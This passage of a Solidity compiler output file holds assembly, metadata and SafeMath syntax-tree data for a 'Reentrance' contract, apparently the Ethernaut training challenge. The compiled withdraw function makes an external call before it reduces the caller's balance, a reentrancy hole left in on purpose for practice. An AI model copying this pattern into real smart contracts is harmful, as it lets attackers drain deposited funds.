											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "3F"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "RETURNDATASIZE",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "RETURNDATACOPY",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "PUSH",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 586,
											"end": 621,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 586,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 569,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 569,
											"end": 621,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 569,
											"end": 621,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 728,
											"end": 735,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 704,
											"end": 712,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 704,
											"end": 724,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 713,
											"end": 723,
											"name": "CALLER",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 704,
											"end": 724,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 704,
											"end": 724,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 704,
											"end": 724,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 704,
											"end": 724,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 704,
											"end": 724,
											"name": "KECCAK256",
											"source": 1
										},
										{
											"begin": 704,
											"end": 724,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 704,
											"end": 735,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "SSTORE",
											"source": 1
										},
										{
											"begin": 704,
											"end": 735,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 517,
											"end": 747,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 517,
											"end": 747,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 517,
											"end": 747,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 464,
											"end": 754,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 345,
											"end": 456,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 399,
											"end": 414,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 434,
											"end": 442,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 443,
											"end": 447,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 434,
											"end": 448,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 434,
											"end": 448,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 434,
											"end": 448,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 434,
											"end": 448,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 434,
											"end": 448,
											"name": "KECCAK256",
											"source": 1
										},
										{
											"begin": 434,
											"end": 448,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 427,
											"end": 448,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 427,
											"end": 448,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 345,
											"end": 456,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2748,
											"end": 2755,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 2767,
											"end": 2776,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2783,
											"end": 2784,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2779,
											"end": 2780,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 2779,
											"end": 2784,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2767,
											"end": 2784,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2767,
											"end": 2784,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2807,
											"end": 2808,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 2802,
											"end": 2803,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2802,
											"end": 2808,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 2802,
											"end": 2808,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"source": 0,
											"value": "1B"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"source": 0,
											"value": "536166654D6174683A206164646974696F6E206F766572666C6F770000000000"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "tag",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 2794,
											"end": 2840,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2857,
											"end": 2858,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2850,
											"end": 2858,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2850,
											"end": 2858,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2850,
											"end": 2858,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2690,
											"end": 2865,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"balanceOf(address)": "70a08231",
							"balances(address)": "27e235e3",
							"donate(address)": "00362a95",
							"withdraw(uint256)": "2e1a7d4d"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_who\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"donate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"security/etheranut/Reentrance/Reentrance.sol\":\"Reentrance\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]},\"security/etheranut/Reentrance/Reentrance.sol\":{\"keccak256\":\"0xd16dc537994c7a77d6625a86ed27c5d51ef804f04a5c24c43a8662b28daecef7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://8fe505fbdb28143c74584d613471ecad8649489b5d0fda3e23545da9759483cd\",\"dweb:/ipfs/QmTwuUHP6FkFmyXsqFmptxmD7qeG4TC36DAUpPrVEwTFCm\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 364,
								"contract": "security/etheranut/Reentrance/Reentrance.sol:Reentrance",
								"label": "balances",
								"offset": 0,
								"slot": "0",
								"type": "t_mapping(t_address,t_uint256)"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"@openzeppelin/contracts/math/SafeMath.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts/math/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							354
						]
					},
					"id": 355,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								">=",
								"0.6",
								".0",
								"<",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:31:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "66:563:0",
								"text": " @dev Wrappers over Solidity's arithmetic operations with added overflow\n checks.\n Arithmetic operations in Solidity wrap on overflow. This can easily result\n in bugs, because programmers usually assume that an overflow raises an\n error, which is the standard behavior in high level programming languages.\n `SafeMath` restores this intuition by reverting the transaction when an\n operation overflows.\n Using this library instead of the unchecked operations eliminates an entire\n class of bugs, so it's recommended to use it always."
							},
							"fullyImplemented": true,
							"id": 354,
							"linearizedBaseContracts": [
								354
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 32,
										"nodeType": "Block",
										"src": "865:98:0",
										"statements": [
											{
												"assignments": [
													15
												],
												"declarations": [
													{
														"constant": false,
														"id": 15,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 32,
														"src": "875:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 14,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "875:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 19,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 18,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 16,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "887:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 17,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 7,
														"src": "891:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "887:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "875:17:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 22,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 20,
														"name": "c",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "906:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 21,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "910:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "906:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 27,
												"nodeType": "IfStatement",
												"src": "902:28:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 23,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "921:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 24,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "928:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 25,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "920:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 13,
													"id": 26,
													"nodeType": "Return",
													"src": "913:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 28,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "948:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"id": 29,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 15,
															"src": "954:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 30,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "947:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 13,
												"id": 31,
												"nodeType": "Return",
												"src": "940:16:0"
											}
										]
									},
									"documentation": {
										"id": 3,
										"nodeType": "StructuredDocumentation",
										"src": "653:131:0",
										"text": " @dev Returns the addition of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 33,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryAdd",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 33,
												"src": "805:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 4,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "805:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 33,
												"src": "816:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 6,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "816:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "804:22:0"
									},
									"returnParameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 10,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 33,
												"src": "850:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 9,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "850:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 12,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 33,
												"src": "856:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 11,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "856:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "849:15:0"
									},
									"scope": 354,
									"src": "789:174:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 59,
										"nodeType": "Block",
										"src": "1185:75:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 47,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 45,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 38,
														"src": "1199:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"id": 46,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 36,
														"src": "1203:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1199:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 52,
												"nodeType": "IfStatement",
												"src": "1195:28:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 48,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1214:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 49,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1221:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 50,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1213:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 44,
													"id": 51,
													"nodeType": "Return",
													"src": "1206:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
